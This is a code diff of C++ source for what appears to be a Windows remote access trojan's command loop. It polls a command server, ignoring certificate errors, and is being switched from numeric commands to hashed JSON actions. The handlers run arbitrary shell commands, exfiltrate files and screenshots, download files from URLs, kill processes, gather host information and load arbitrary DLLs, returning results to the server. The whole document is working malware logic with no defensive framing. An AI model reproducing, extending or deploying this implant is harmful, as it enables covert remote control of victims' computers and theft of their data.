@@ -17,55 +17,61 @@ void mainloop() {
 		HANDLE hRequest = HttpOpenRequestA(hConnect, c.strings.post.c_str(), c.endpoints.heartbeat.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
 		std::string response = sendRequestGetResponse(hRequest);
 		response = decode(c.key, response);
-
-		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
-		std::string code = response.substr(0, response.find(" "));
+		std::cout << response << "\n";
+		nlohmann::json parsed;
+		long code;
+		try {
+			parsed = nlohmann::json::parse(response);
+			code = stringhash(parsed["action"]);
+		} 
+		catch (nlohmann::json::parse_error& ex) {
+			std::cout << "Could not parse response as JSON" << "\n";
+			code = 0;
+		}
+		
+		//Process request here. 
 		std::string outString;
-		size_t first;
-		size_t second;
-		switch (atoi(code.c_str())) {
-		case 1:
+		switch (code) {
+		case 1883:
 			//OK
 			break;
-		case 2:
+		case 459983:
 			//INFO
 			outString = gatherInfo(&c.strings, hInternet);
 			std::cout << outString << "\n";
 			sendEncodedString(&c.strings, c.key, outString, c.endpoints.info, hConnect);
 			break;
-		case 3:
+		case 1907:
 			//PS
 			outString = getProcToStr();
 			std::cout << outString << "\n";
 			sendEncodedString(&c.strings, c.key, outString, c.endpoints.ps, hConnect);
 			break;
-		case 4:
-			//RUN
-			outString = execCmd(&c.strings, response.substr(response.find(" ") + 1), c.cmdtimeout);
+		case 7990316:
+			//SHELL
+			outString = execCmd(&c.strings, parsed["command"], c.cmdtimeout);
 			std::cout << outString << "\n";
 			sendEncodedString(&c.strings, c.key, outString, c.endpoints.out, hConnect);
 			break;
-		case 5:
+		case 130495860:
 			//UPLOAD
-			doFileUpload(&c.strings, hConnect, (char*)response.substr(response.find(" ") + 1).c_str(), c.xorKey, c.endpoints.upload.c_str());
+			doFileUpload(&c.strings, hConnect, (char*)parsed["path"].get<std::string>().c_str(), c.xorKey, c.endpoints.upload.c_str());
 			break;
-		case 6:
+		case 1226493124:
 			//DOWNLOAD
-			first = response.find(" ");
-			second = response.find(" ", first + 1);
-			doFileDownload(response.substr(first + 1, second - 2), response.substr(second + 1));
+			doFileDownload(parsed["url"], parsed["path"]);
 			break;
-		case 7:
+		case 466988:
 			//KILL
-			killProcess(atoi(response.substr(response.find(" ") + 1).c_str()));
+			killProcess(parsed["pid"]);
 			break;
-		case 8:
+		case 71109652:
 			//SCREENSHOT
 			doScreenshotUpload(&c.strings, hConnect, takeScreenshotAndSaveToMemory(), c.xorKey, c.endpoints.upload.c_str());
 			break;
-		case 9:
+		case 1299521577:
 			//LOADLIBRARY
-			LoadLibraryA(response.substr(response.find(" ") + 1).c_str());
+			LoadLibraryA(parsed["path"].get<std::string>().c_str());
 		default:
 			break;
 		}
